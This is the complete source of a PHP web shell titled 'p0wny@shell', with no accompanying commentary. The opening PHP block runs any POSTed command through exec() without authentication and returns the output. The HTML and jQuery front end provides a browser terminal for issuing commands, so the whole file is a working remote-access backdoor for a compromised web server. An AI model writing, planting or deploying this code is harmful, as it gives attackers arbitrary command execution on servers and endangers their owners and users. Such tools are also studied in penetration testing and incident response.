<?php

if ($_GET["feature"] == "shell") {
    exec($_POST["command"], $stdout);
    foreach($stdout as $line) {
        echo $line . "\n";
    }
    die();
}

?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>p0wny@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }

            #shell {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 355, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
                font-weight: bold;
                color: #75DF0B;
            }

            #shell-input > input {
                flex-grow: 1;
                height: 30px;
                line-height: 30px;
                padding: 0 5px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
            }
        </style>

        <script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>

        <script>
            function execCmd(command) {
                return $.post("?feature=shell", {command: command}, "text");
            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function insertCommand(command) {
                var eShellContent = document.getElementById("shell-content");
                eShellContent.innerHTML += "\n";
                eShellContent.innerHTML += "<span class=\"shell-prompt\">p0wny@shell:~#</span> ";
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function insertStdout(stdout) {
                var eShellContent = document.getElementById("shell-content");
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _onShellCmdKeyDown(event) {
                var eShellCmdInput = document.getElementById("shell-cmd");
                if (event.key == "Enter") {
                    insertCommand(eShellCmdInput.value);
                    execCmd(eShellCmdInput.value)
                        .then(insertStdout)
                        .fail(error => insertStdout("AJAX ERROR: " + JSON.stringify(error)));
                    eShellCmdInput.value = "";
                }
            }
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
        ___                         ____      _          _ _        _  _   <span></span>
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
|_|                         |___/  \____/                                  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd">p0wny@shell:~#</label>
                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
            </div>
        </div>
    </body>

</html>
